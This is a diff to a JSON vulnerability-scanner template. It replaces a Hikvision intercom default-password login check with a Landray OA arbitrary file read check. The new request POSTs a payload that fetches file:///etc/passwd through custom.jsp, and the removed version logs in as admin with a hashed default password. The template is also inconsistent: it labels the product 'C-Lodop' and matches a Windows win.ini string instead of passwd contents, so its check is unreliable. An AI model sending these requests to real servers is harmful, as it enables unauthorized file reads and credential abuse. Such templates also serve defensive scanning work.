@@ -1,15 +1,16 @@
 {
-    "Name": "hikvision-intercom-service-default-password",
-    "Description": "Hikvision intercom service configuration platform weak password",
-    "Product": "Hikvision",
+    "Name": "Landray OA Arbitrary File Read",
+    "Description": "Landray OA custom.jsp arbitrary file read",
+    "Product": "C-Lodop",
     "author": "chumeng",
     "Request":[
         {
         "Method": "POST",
-        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
-        "Uri":"/authorize.action",
+        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
+        "Content-Type":"application/x-www-form-urlencoded"},
+        "Uri":"/sys/ui/extend/varkind/custom.jsp",
         "Port":"",
-        "Data":"username=admin&userpsw=827ccb0eea8a706c4c34a16891f84e7b&language=zh_cn",
+        "Data":"var={\"body\":{\"file\":\"file:///etc/passwd\"}}",
         "Follow_redirects":"false",
         "Upload":{"Name": "","fileName": "","filePath": "" },
         "Response":{
@@ -18,7 +19,7 @@
                 {
                 "Operation": "contains", 
                 "Key":"",
-                "Value": "{\"success\": true, \"msg\": \"OK\"}                "
+                "Value": "for 16-bit app support"
                 },
                  {
                 "Operation": "code", 
@@ -30,4 +31,3 @@
         "Next_decide":""
                 }
 ]}
-
